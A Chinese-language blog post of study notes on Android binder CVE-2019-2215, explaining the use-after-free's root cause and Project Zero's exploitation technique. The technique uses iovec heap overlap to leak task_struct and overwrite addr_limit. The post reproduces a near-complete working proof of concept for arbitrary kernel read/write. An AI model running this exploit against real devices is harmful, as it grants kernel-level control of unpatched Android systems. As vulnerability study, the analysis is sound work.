---
title: "CVE-2019-2215 Study Notes"
date: 2020-06-23T00:42:00+08:00
categories: ["Linux", "CVE", "Exploit", "Android"]
tags: ["Android", "Linux", "CVE", "Exploit"]
---

最近有了点时间，好好看了下CVE-2019-2215的漏洞利用细节，这里记录下来，一方面留着以后再看方便，一方面把自己的理解写出来也是学习的一种方式。

这里问我写的内容可以看成是对Google Project Zero的文章的翻译加上一些个人想法，不过还是推荐看看原文，链接在[这里](https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html), 因为看的其他的多多少少都有点模糊的地方,没有P0的文章说的详细，这也是我想自己写一个分析的原因。

## 1. Root Cause

通过阅读对应的[issue page](https://bugs.chromium.org/p/project-zero/issues/detail?id=1942)和
根据对应的内核[Patch](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/drivers/android/binder.c?h=linux-4.14.y&id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b)\(需要注意commit里的内容不太准确\),
造成CVE-2019-2215的根本原因在于binder driver内部在收到```BINDER_THREAD_EXIT```的ioctl后，负责释放对应binder_thread的函数在free binder_thread前没有检查当前binder_thread 是否在epoll中存在引用，从而导致在epoll中存在引用的binder_thread在被释放后依然在epoll中存在一个悬挂指针。当后面epoll因为一些原因尝试删除该已经被释放的binder_thread内部指向的一个waitqueue时出现未定义行为，如Crash\(*当被free的binder_thread所在的内存已经被分配给其他对象复写破坏时*\)

利用下面的poc可以在开了KASAN的对应kernel上触发crash

```cpp
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define BINDER_THREAD_EXIT 0x40046208ul

int main()
{
        int fd, epfd;
        struct epoll_event event = { .events = EPOLLIN };

        fd = open("/dev/binder0", O_RDONLY);
        epfd = epoll_create(1000);
        epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &event);
        ioctl(fd, BINDER_THREAD_EXIT, NULL);
}
```

整个触发时间过程如下图：
![binder poll crash](/images/cve20192215/crashTimeline.jpg)

可以看到首先通过```ioctl``` 释放binder_thread, 然后程序退出，触发epoll的waitqueue删除操作，从而触发crash。在没打补丁且开了KASAN的对应虚拟机上尝试，可以得到如下的call stack。

![kasan](/images/cve20192215/kasan.jpg)

从这里就能看到Crash是在remove_wait_queue里面被触发，因为
[```ep_remove_wait_queue```](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/fs/eventpoll.c?h=linux-4.14.y&id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b)调用了[```remove_wait_queue```](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/kernel/sched/wait.c?h=linux-4.14.y&id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b)， 而```remove_wait_queue```里面调用了[```spin_lock_irqsave```](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/include/linux/spinlock.h?h=linux-4.14.y&id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b)

```cpp
static void ep_remove_wait_queue(struct eppoll_entry *pwq)
{
        wait_queue_head_t *whead;

        rcu_read_lock();
        /*
        * If it is cleared by POLLFREE, it should be rcu-safe.
        * If we read NULL we need a barrier paired with
        * smp_store_release() in ep_poll_callback(), otherwise
        * we rely on whead->lock.
        */
        whead = smp_load_acquire(&pwq->whead);
        if (whead)
                remove_wait_queue(whead, &pwq->wait);
        rcu_read_unlock();
}

void remove_wait_queue(struct wait_queue_head *wq_head, struct wait_queue_entry *wq_entry)
{
        unsigned long flags;

        spin_lock_irqsave(&wq_head->lock, flags);
        __remove_wait_queue(wq_head, wq_entry);
        spin_unlock_irqrestore(&wq_head->lock, flags);
}
EXPORT_SYMBOL(remove_wait_queue);
```

![log with printk](/images/cve20192215/logWithPrintk.jpg)

通过分析crash时的log\(这里我自己加了printk在binder_thread和ep_remove_wait_queue里面\)，可以看到Crash时候的binder_thread object的地址是```0xffff888046070008```，同时在Crash之前的最后一个被释放的```eppoll_entry```的地址是```0xffff88803ab6e6a8```。 为了验证binder_thread object对应的fd被加到epoll中后两者的对应关系，我们使用kgdb调试一下kernel，这里具体怎么编译调试的kernel不具体展开，直接看调试打印的变量信息。

![kgdb info](/images/cve20192215/kgdbInfo.jpg)

可以看到上面crash log里面```eppoll_entry.whead```刚好就是```binder_thread.wait```，所以现在可以确定这里```ep_remove_wait_queue```的```whead```变量，即```remove_wait_queue```的参数```wq_head```就是已经是被释放的binder_thread里的wait，所以当引用```wait->lock```时指向了一段已经被free的内存，从而在```spin_lock_irqsave```尝试去写```wait->lock```时触发KASAN报错。

如果深入检查```spin_lock_irqsave```，会发现最终调用了[```_raw_spin_lock_irqsave```](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/include/linux/spinlock_api_smp.h?h=linux-4.14.y&id=7a3cee43e935b9d526ad07f20bf005ba7e74d05b)，其反汇编代码如下，可以看到其中做KASAN检查的地方。这里具体不再展开。
![raw spin lock irqsave](/images/cve20192215/raw_spin_locl_irqsave_disassembly.jpg)

需要注意的是，如果```lock```本身不是0，那么在这里就会hang住，下面的```__remove_wait_queue```就无法执行，所以后面在做利用的时候需要做到能**保持```binder_thread.wait.lock```的值为0.**

## 2. Exploit

前面在Root Cause里面已经分析过，之所以被KASAN检测到是因为binder_thread 已经被释放，所以wait指向的内存已经被打上KASAN的标记，但是如果KASAN没有开启，epoll的remove流程会继续走下去，最终走到```__list_del```。当然，P0的文章里也有提到，如果```CONFIG_DEBUG_LIST```开启的话，会走不同的代码块，并且有很多check，所以不会有exploit的机会存在，这里只讨论没有开启该flag的情况。

```cpp
static inline void
__remove_wait_queue(struct wait_queue_head *wq_head, struct wait_queue_entry *wq_entry)
{
        list_del(&wq_entry->entry);
}


#ifndef CONFIG_DEBUG_LIST
...
static inline void list_del(struct list_head *entry)
{
        __list_del(entry->prev, entry->next);
        entry->next = LIST_POISON1;
        entry->prev = LIST_POISON2;
}

static inline void __list_del(struct list_head * prev, struct list_head * next)
{
        next->prev = prev;
        WRITE_ONCE(prev->next, next);
}
```

这里最开始的```old```就是```eppoll_entry.wait```，根据代码的解释，即为```binder_thread.wait```指向的链表上的一个**item**。

```cpp
/* Wait structure used by the poll hooks */
struct eppoll_entry {
        /* List header used to link this structure to the "struct epitem" */
        struct list_head llink;

        /* The "base" pointer is set to the container "struct epitem" */
        struct epitem *base;

        /*
        * Wait queue item that will be linked to the target file wait
        * queue head.
        */
        wait_queue_t wait;

        /* The wait queue head that linked the "wait" wait queue item */
        wait_queue_head_t *whead;
};
```

所以当最终走到```__list_del```时，里面的unlink操作```next->prev=prev```通过构造一个虚假的binder_thread 对象在已经被free的binder_thread对应的地址处，就可以完成泄漏内存信息和关键数据修改。

### 2.1 Preparing

要做kernel里的堆布局，那就必须要对想要覆盖的结构体有足够的了解。这里先看一下```binder_thread```的代码。

```cpp
/**
 * struct binder_thread - binder thread bookkeeping
 * @proc:                 binder process for this thread
 *                        (invariant after initialization)
 * @rb_node:              element for proc->threads rbtree
 *                        (protected by @proc->inner_lock)
 * @waiting_thread_node:  element for @proc->waiting_threads list
 *                        (protected by @proc->inner_lock)
 * @pid:                  PID for this thread
 *                        (invariant after initialization)
 * @looper:               bitmap of looping state
 *                        (only accessed by this thread)
 * @looper_needs_return:  looping thread needs to exit driver
 *                        (no lock needed)
 * @transaction_stack:    stack of in-progress transactions for this thread
 *                        (protected by @proc->inner_lock)
 * @todo:                 list of work to do for this thread
 *                        (protected by @proc->inner_lock)
 * @process_todo:         whether work in @todo should be processed
 *                        (protected by @proc->inner_lock)
 * @return_error:         transaction errors reported by this thread
 *                        (only accessed by this thread)
 * @reply_error:          transaction errors reported by target thread
 *                        (protected by @proc->inner_lock)
 * @wait:                 wait queue for thread work
 * @stats:                per-thread statistics
 *                        (atomics, no lock needed)
 * @tmp_ref:              temporary reference to indicate thread is in use
 *                        (atomic since @proc->inner_lock cannot
 *                        always be acquired)
 * @is_dead:              thread is dead and awaiting free
 *                        when outstanding transactions are cleaned up
 *                        (protected by @proc->inner_lock)
 * @task:                 struct task_struct for this thread
 *
 * Bookkeeping structure for binder threads.
 */
struct binder_thread {
        struct binder_proc *proc;
        struct rb_node rb_node;
        struct list_head waiting_thread_node;
        int pid;
        int looper;              /* only modified by this thread */
        bool looper_need_return; /* can be written by other thread */
        struct binder_transaction *transaction_stack;
        struct list_head todo;
        bool process_todo;
        struct binder_error return_error;
        struct binder_error reply_error;
        wait_queue_head_t wait;
        struct binder_stats stats;
        atomic_t tmp_ref;
        bool is_dead;
        struct task_struct *task;
};
```

这里我们需要注意的是整个binder_thread的size以及```wait```和```task```的偏移。因为最终我们的目的是构造一个和binder_thread类似size的内核变量去复用同一块内存，然后利用删除链表时对```wait```的操作去获取```task```的值，然后再次利用unlink去改写```addr_limit```。通过调试，我们可以得到```binder_thread```的size为**0x198**, ```wait```的offset为**0xA0**, ```task```的offset为**0x190**.

![binder thread size](/images/cve20192215/binder_thread_infos.png)

### 2.2 Kernel Object Choosing

为了能够成功复写被Free的binder_thread所在的内存区域，我们需要构造一个大小类似的内核结构或者对象，这里选用的是```struct iovec```.

```cpp
// sizeof(iovec) = 0x10
struct iovec
{
        void __user *iov_base;
        __kernel_size_t iov_len;
};
```

通过使用```writev```和```readv```，可以用来向指定stream写入存储在不连续内存块（由iovsec[]定义）中的数据，或者从指定stream读出数据写入一些不连续的内存块中。其中```iov_base```指定每个内存块的地址，```iov_len```描述每个内存块的size。

使用iovec的其好处在于```iov_base```和```iov_len```都是可控的，只要绕过传入内核时对```iov_base```做的是否在```userspace```的校验，往后的任意修改都不会有```iov_base```必须是指向userspace address的校验。

```cpp
struct task_struct {
#ifdef CONFIG_THREAD_INFO_IN_TASK
        /*
        * For reasons of header soup (see current_thread_info()), this
        * must be the first element of task_struct.
        */
        struct thread_info      thread_info;
        #endif
        /* -1 unrunnable, 0 runnable, >0 stopped: */
        volatile long           state;
        ...
};

struct thread_info {
        unsigned long   flags;          /* low level flags */
        mm_segment_t    addr_limit;     /* address limit */
        #ifdef CONFIG_ARM64_SW_TTBR0_PAN
        u64             ttbr0;          /* saved TTBR0_EL1 */
        #endif
        int             preempt_count;  /* 0 => preemptable, <0 => bug */
        ...
};
```

这里```addr_limit```的offset是和机器architecture相关的,上面提供的是针对arm64的对应结构的截图，可以看到```task_struct```的第一个field为```thread_info```,```addr_limit```是在```thread_info```的**0x8**偏移处，所以我们在拿到```task_struct```的地址后，**0x8** offset处即为```addr_limit```。

### 2.3 Leaking Task\_Structure

现在和目标结构题相关的信息，需要注意去bypass的点，以及具体利用unlink的点我们已经大概清楚：

+ binder_thread 的size为0x198
  + wait 的offset为0xa0
    + wait.lock的值必须为0,否则执行流无法走到unlink处
  + task 的offset为 0x190
    + 这里我们要leak前次binder_thread的task数据，所以我们在overlap的时候不能覆盖到0x190之后的内容。
+ arm64下addr\_limit位于task\_struct 的0x8处
+ iovec的size为0x10
  + iovec.base 必须是指向用户地址，否则不能通过传入kernel时的校验

所以为了能有较大几率在内核复用被释放的binder_thread使用的内存，我们需要
准备一个大小类似的```iovec``` array，再加上我们不能覆盖想要leak的前一个```binder_thread.task```的内容，所以我们需要准备```0x190 / 0x10 = 0x19``` 个iovec，即```iovec[25]```，而且为了能利用wait去实现unlink，所以```iovec[0xa0 / 0x10]```处要准备上符合要求且精心构造的数据。这里借用P0博客里的图片展示内存对应关系：

![leak task_struct](/images/cve20192215/leak_task_struct.png)

在确定大概的对应的关系后，我们还需要让相关内存块的内容满足如下要求：

+ ```wait.lock``` 需要为**0x0**
+ ```iovec.base``` 必须指向用户空间地址
+ ```wait.task_list.next```和```wait.task_list.prev```在unlink后都会指向```wait.task_list.next```

为了实现这个要求，P0在原文中使用了如下的数据来填充关键内存块：

![heap layout for leaking task](/images/cve20192215/heap_layout_leaking_task.jpg)

相关代码如下：
```cpp
#define BINDER_THREAD_EXIT 0x40046208ul
// NOTE: we don't cover the task_struct* here; we want to leave it uninitialized
#define BINDER_THREAD_SZ 0x190
#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) //25
#define WAITQUEUE_OFFSET 0xA0
#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) //10

// Alloc a userspace memory which will satisfy wait.lock == 0
// and iovec.base point to userspace
dummy_page_4g_aligned = mmap((void*)0x100000000UL, 0x2000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

// Forming iovec[25]
struct iovec iovec_array[IOVEC_ARRAY_SZ];
memset(iovec_array, 0, sizeof(iovec_array));

iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; /* spinlock in the low address half must be zero */
iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0x1000; /* wq->task_list->next */
iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; /* wq->task_list->prev */
iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x1000;

int b;

int pipefd[2];
if (pipe(pipefd)) err(1, "pipe");
if (fcntl(pipefd[0], F_SETPIPE_SZ, 0x1000) != 0x1000) err(1, "pipe size");
static char page_buffer[0x1000];
```

```iovec[0]```到```iovec[9]```里的内容都是**0x0**，对于```iovec.base```和```iovec.len```都为**0x0**的元素，在写入和读出时将直接跳过。
对于```iovec[10]```\(对应于```wait.lock```和```wait.task_list.next```\)和```iovec[11]```\(对应于```wait.task_list.prev```\)，则填入我们精心构造的数据: 为了满足```wait.lock```\(32bit\)为**0x0**且```iovec.base```指向用户空间，我们需要申请一个低32bit全为0的用户空间内存块，P0原文里申请的是```0x100000000UL```，刚好满足上述两个要求。

前面已经分析过，在触发unlink时，```binder_thread.wait```是head，对应于```eppoll_entry.whead```，而要删除的元素对应于```eppoll_entry.wait```，而要删除的元素是当前list里面唯一的元素，所以删除后留下的只有```eppoll_entry.whead```本身，此时head的next和prev都指向其自己。这里直接引用P0的解释图：

![before list del](/images/cve20192215/CVE-2019-2215-UAF-before-list_del.png)
![after list del](/images/cve20192215/CVE-2019-2215-UAF-post-list_del.png)

unlink前，

```cpp
eppoll_entry.whead->next = 0x1000;
eppoll_entry.whaed->prev = 0xDEADBEEF;

eppoll_entry.wait->next = eppoll_entry.whead;
eppoll_entry.wait->prev = eppoll_entry.wheah;
```

unlink时，根据```list_del```的代码：

```cpp
static inline void list_del(struct list_head *entry)
{
        __list_del(entry->prev, entry->next);
        entry->next = LIST_POISON1;
        entry->prev = LIST_POISON2;
}

// Here prev, next all point whead.
static inline void __list_del(struct list_head * prev, struct list_head * next)
{
        next->prev = prev;
        WRITE_ONCE(prev->next, next);
}
```

则unlink完成后，内存布局如下：

![leaking task after unlink](/images/cve20192215/leak_task_after_unlink.jpg)

这里需要注意的是，在开始触发unlink前，会先在父进程用```writev```阻塞管道\(前面已经把pipe的buffer设置为0x1000\)

```cpp
ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
b = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);
```

+ 在unlink前，父进程```writev```将```iovec[10]```指向的```dummy_page_4g_aligned```内存块的```0x1000```内存读出写入pipe，而后阻塞。
+ 而后子进程触发unlink，改写```iovec[11].iov_base```为指向```&iovec[10].iov_len```的指针，接着使用```readv```读出已经被```writev```写入pipe的```dummy_page_4g_aligned```内容
+ 此时```writev```读取```iovec[11].iov_base```的内容\(此时已被改写为指向```binder_thread.wait.task_list```的指针\)，父进程再次调用```readv```，成功读出被释放从```binder_thread.wait.task_list```开始的```0x1000```字节内容到```buffer```
+ 此时```buffer + 0xE8```即为```task```指针值。从而成功拿到当前进程的```task_struct```结构体地址\(```wait```偏移为```0xa0```, ```task```偏移为```0x190```，```wait.task_list```在```wait + 0x8```处，所以distance为```0x190-0xa0-0x8 = 0xe8```\)

```cpp
struct list_head {
        struct list_head *next, *prev;
};

struct wait_queue_head {
        spinlock_t              lock; // 8 Bytes
        struct list_head        head;
};
typedef struct wait_queue_head wait_queue_head_t;

// spinlock_t finally will be below in arm64 8Bytes
typedef struct {
#ifdef __AARCH64EB__
        u16 next;
        u16 owner;
#else
        u16 owner;
        u16 next;
#endif
} __aligned(4) arch_spinlock_t;

```

![wait.head offset](/images/cve20192215/wait_head_offset.png)

---

unlink关键利用代码如下：

```cpp
pid_t fork_ret = fork();
if (fork_ret == -1) err(1, "fork");
if (fork_ret == 0){
/* Child process */
prctl(PR_SET_PDEATHSIG, SIGKILL);
sleep(2);
printf("CHILD: Doing EPOLL_CTL_DEL.\n");
epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
printf("CHILD: Finished EPOLL_CTL_DEL.\n");
// first page: dummy data
if (read(pipefd[0], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, "read full pipe");
close(pipefd[1]);
printf("CHILD: Finished write to FIFO.\n");

exit(0);
}
//printf("PARENT: Calling READV\n");
ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
b = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);
printf("writev() returns 0x%x\n", (unsigned int)b);
// second page: leaked data
if (read(pipefd[0], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, "read full pipe");
```

### 2.4 Overwrite addr\_limit

前面已经拿到了进程的```task_struct```，下面将会重复类用与上面相似的```iovec[25]```布局去尝试改写```addr_limit```。 与leaking ```task_struct```相比，不同之处在于本次不再用```writev```，而使用```recvmsg```去接收```iovsec[25]```，阻塞等待，直到```write```写入数据篡改```addr_limit```:

利用```socket```，同样可以如读写```iovec```数组：

```cpp
struct msghdr msg = {
.msg_iov = iovec_array,
.msg_iovlen = IOVEC_ARRAY_SZ
};
```

这里只需准备好```msghdr```结构体，而后利用```recvmsg```等待数据写入```iovec[25]```即可。

```cpp
int recvmsg_result = recvmsg(socks[0], &msg, MSG_WAITALL);
```

再看本次unlink前使用的内存布局：

```cpp
struct iovec iovec_array[IOVEC_ARRAY_SZ];
memset(iovec_array, 0, sizeof(iovec_array));

// Unlink Layout
iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; /* spinlock in the low address half must be zero */
iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 1; /* wq->task_list->next */
iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; /* wq->task_list->prev */
iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x8 + 2 * 0x10; /* iov_len of previous, then this element and next element */
iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (void *)0xBEEFDEAD;
iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = 8; /* should be correct from the start, kernel will sum up lengths when importing */

```

![secondary iovec layout](/images/cve20192215/secondary_iovec_layout.jpg)

本次布局和前次略有不同:

+ ```iovec[10].iov_len = 1```，这里在后面会在创建socket后首先写入1 Byte到```dummy_page_4g_aligned```指向的内存，令```write```下次写入时将从```iovsec[11].iov_base```指向的内存块开始写入数据。

```cpp
int socks[2];
if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks)) err(1, "socketpair");
if (write(socks[1], "X", 1) != 1) err(1, "write socket dummy byte");
```

接下来触发unlink漏洞：

```cpp
pid_t fork_ret = fork();
if (fork_ret == -1) err(1, "fork");
if (fork_ret == 0){
        /* Child process */
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        sleep(2);
        printf("CHILD: Doing EPOLL_CTL_DEL.\n");
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
        printf("CHILD: Finished EPOLL_CTL_DEL.\n");
        // write second_chunk
        if (write(socks[1], second_write_chunk, sizeof(second_write_chunk)) != sizeof(second_write_chunk))
                err(1, "write second chunk to socket");
        exit(0);
}
ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
struct msghdr msg = {
.msg_iov = iovec_array,
.msg_iovlen = IOVEC_ARRAY_SZ
};
int recvmsg_result = recvmsg(socks[0], &msg, MSG_WAITALL);
```

![overwrite addr_limit](/images/cve20192215/overwrite_addr_limit.jpg)

这里借用P0 blog里的图。左边是unlink后的内存布局。
首先依然是利用unlink去改写```iovec[10].iov_len```和```iovec[11].iov_base```，使其指向```iovec[10].iov_len```。
而后就是本次攻击的重点，右边部分，该布局是

```cpp
if (write(socks[1], second_write_chunk, sizeof(second_write_chunk)) != sizeof(second_write_chunk))
        err(1, "write second chunk to socket");
```

写入```second_write_chunk```后的效果。

```cpp
unsigned long second_write_chunk[] = {
        1, /* iov_len */ (already used) */
        0xdeadbeef, /* iov_base (already used) */
        0x8 + 2 * 0x10, /* iov_len (already used) */
        current_ptr + 0x8, /* next iov_base (addr_limit) */
        8, /* next iov_len (sizeof(addr_limit)) */
        0xfffffffffffffffe /* value to write - new addr_limit */
};
```

首先，此时```write```会从```iovec[11].iov_base```指向的内存开始写入数据，并且写入数据的size为**0x28** Bytes。而此时```iovec[11].iov_base```指向```iovec[10].iov_len```所在内存，即偏移为```binder_thread + 0xa8```处。从而将从```0xa8```偏移处，依次写入```second_write_chunk```中的数据。

```cpp
iovec[10].iov_len = 1;
iovec[11].iov_base = 0xdeadbeef;
iovec[11].iov_len = 0x28;
iovec[12].iov_base = current_ptr + 0x8;
iovec[12].iov_len = 0x8;
```

以上刚好是0x28 Bytes的数据，而```current_ptr```正是我们已经通过第一次leak ```tast_struct``` 得到的地址，所以此时的```iovec[12].iov_base```就指向了```addr_limit```所在的内存。同时```iovec[11].iob_base```指向的内存\(从```iovec[10].iov_len```开始的0x28 Bytes\)已经写完。所以此时```write```会将接下来的数据写入```iovec[12].iov_base```指向的内存\(也即存储```addr_limit```的内存\)，即

```cpp
// current_ptr + 0x8 points to task_stuct.thread_info.addr_limit
*(current_ptr + 0x8) = 0xfffffffffffffffe;
```

到这里，就成功篡改了```addr_limit```的限制，后面即可读写kernel任意内存。

### 2.5 Full Poc

这里把 P0提供的完整[poc](https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885)贴在这里，方便查阅。

```cpp
/*
 * POC to gain arbitrary kernel R/W access using CVE-2019-2215
 * https://bugs.chromium.org/p/project-zero/issues/detail?id=1942
 *
 * Jann Horn & Maddie Stone of Google Project Zero
 *
 * 3 October 2019
*/

#define _GNU_SOURCE
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <ctype.h>
#include <sys/uio.h>
#include <err.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <linux/sched.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <errno.h>

#define BINDER_THREAD_EXIT 0x40046208ul
// NOTE: we don't cover the task_struct* here; we want to leave it uninitialized
#define BINDER_THREAD_SZ 0x190
#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) //25
#define WAITQUEUE_OFFSET 0xA0
#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) //10

void hexdump_memory(unsigned char *buf, size_t byte_count) {
  unsigned long byte_offset_start = 0;
  if (byte_count % 16)
    errx(1, "hexdump_memory called with non-full line");
  for (unsigned long byte_offset = byte_offset_start; byte_offset < byte_offset_start + byte_count;
          byte_offset += 16) {
    char line[1000];
    char *linep = line;
    linep += sprintf(linep, "%08lx  ", byte_offset);
    for (int i=0; i<16; i++) {
      linep += sprintf(linep, "%02hhx ", (unsigned char)buf[byte_offset + i]);
    }
    linep += sprintf(linep, " |");
    for (int i=0; i<16; i++) {
      char c = buf[byte_offset + i];
      if (isalnum(c) || ispunct(c) || c == ' ') {
        *(linep++) = c;
      } else {
        *(linep++) = '.';
      }
    }
    linep += sprintf(linep, "|");
    puts(line);
  }
}

int epfd;

void *dummy_page_4g_aligned;
unsigned long current_ptr;
int binder_fd;

void leak_task_struct(void)
{
  struct epoll_event event = { .events = EPOLLIN };
  if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add");

  struct iovec iovec_array[IOVEC_ARRAY_SZ];
  memset(iovec_array, 0, sizeof(iovec_array));

  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; /* spinlock in the low address half must be zero */
  iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0x1000; /* wq->task_list->next */
  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; /* wq->task_list->prev */
  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x1000;

  int b;

  int pipefd[2];
  if (pipe(pipefd)) err(1, "pipe");
  if (fcntl(pipefd[0], F_SETPIPE_SZ, 0x1000) != 0x1000) err(1, "pipe size");
  static char page_buffer[0x1000];
  //if (write(pipefd[1], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, "fill pipe");

  pid_t fork_ret = fork();
  if (fork_ret == -1) err(1, "fork");
  if (fork_ret == 0){
    /* Child process */
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    sleep(2);
    printf("CHILD: Doing EPOLL_CTL_DEL.\n");
    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
    printf("CHILD: Finished EPOLL_CTL_DEL.\n");
    // first page: dummy data
    if (read(pipefd[0], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, "read full pipe");
    close(pipefd[1]);
    printf("CHILD: Finished write to FIFO.\n");

    exit(0);
  }
  //printf("PARENT: Calling READV\n");
  ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
  b = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);
  printf("writev() returns 0x%x\n", (unsigned int)b);
  // second page: leaked data
  if (read(pipefd[0], page_buffer, sizeof(page_buffer)) != sizeof(page_buffer)) err(1, "read full pipe");
  //hexdump_memory((unsigned char *)page_buffer, sizeof(page_buffer));

  printf("PARENT: Finished calling READV\n");
  int status;
  if (wait(&status) != fork_ret) err(1, "wait");

  current_ptr = *(unsigned long *)(page_buffer + 0xe8);
  printf("current_ptr == 0x%lx\n", current_ptr);
}

void clobber_addr_limit(void)
{
  struct epoll_event event = { .events = EPOLLIN };
  if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add");

  struct iovec iovec_array[IOVEC_ARRAY_SZ];
  memset(iovec_array, 0, sizeof(iovec_array));

  unsigned long second_write_chunk[] = {
    1, /* iov_len */
    0xdeadbeef, /* iov_base (already used) */
    0x8 + 2 * 0x10, /* iov_len (already used) */
    current_ptr + 0x8, /* next iov_base (addr_limit) */
    8, /* next iov_len (sizeof(addr_limit)) */
    0xfffffffffffffffe /* value to write */
  };

  iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummy_page_4g_aligned; /* spinlock in the low address half must be zero */
  iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 1; /* wq->task_list->next */
  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (void *)0xDEADBEEF; /* wq->task_list->prev */
  iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = 0x8 + 2 * 0x10; /* iov_len of previous, then this element and next element */
  iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (void *)0xBEEFDEAD;
  iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = 8; /* should be correct from the start, kernel will sum up lengths when importing */

  int socks[2];
  if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks)) err(1, "socketpair");
  if (write(socks[1], "X", 1) != 1) err(1, "write socket dummy byte");

  pid_t fork_ret = fork();
  if (fork_ret == -1) err(1, "fork");
  if (fork_ret == 0){
    /* Child process */
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    sleep(2);
    printf("CHILD: Doing EPOLL_CTL_DEL.\n");
    epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
    printf("CHILD: Finished EPOLL_CTL_DEL.\n");
    if (write(socks[1], second_write_chunk, sizeof(second_write_chunk)) != sizeof(second_write_chunk))
      err(1, "write second chunk to socket");
    exit(0);
  }
  ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
  struct msghdr msg = {
    .msg_iov = iovec_array,
    .msg_iovlen = IOVEC_ARRAY_SZ
  };
  int recvmsg_result = recvmsg(socks[0], &msg, MSG_WAITALL);
  printf("recvmsg() returns %d, expected %lu\n", recvmsg_result,
      (unsigned long)(iovec_array[IOVEC_INDX_FOR_WQ].iov_len +
      iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len +
      iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len));
}

int kernel_rw_pipe[2];
void kernel_write(unsigned long kaddr, void *buf, unsigned long len) {
  errno = 0;
  if (len > 0x1000) errx(1, "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
  if (write(kernel_rw_pipe[1], buf, len) != len) err(1, "kernel_write failed to load userspace buffer");
  if (read(kernel_rw_pipe[0], (void*)kaddr, len) != len) err(1, "kernel_write failed to overwrite kernel memory");
}
void kernel_read(unsigned long kaddr, void *buf, unsigned long len) {
  errno = 0;
  if (len > 0x1000) errx(1, "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
  if (write(kernel_rw_pipe[1], (void*)kaddr, len) != len) err(1, "kernel_read failed to read kernel memory");
  if (read(kernel_rw_pipe[0], buf, len) != len) err(1, "kernel_read failed to write out to userspace");
}
unsigned long kernel_read_ulong(unsigned long kaddr) {
  unsigned long data;
  kernel_read(kaddr, &data, sizeof(data));
  return data;
}
void kernel_write_ulong(unsigned long kaddr, unsigned long data) {
  kernel_write(kaddr, &data, sizeof(data));
}
void kernel_write_uint(unsigned long kaddr, unsigned int data) {
  kernel_write(kaddr, &data, sizeof(data));
}

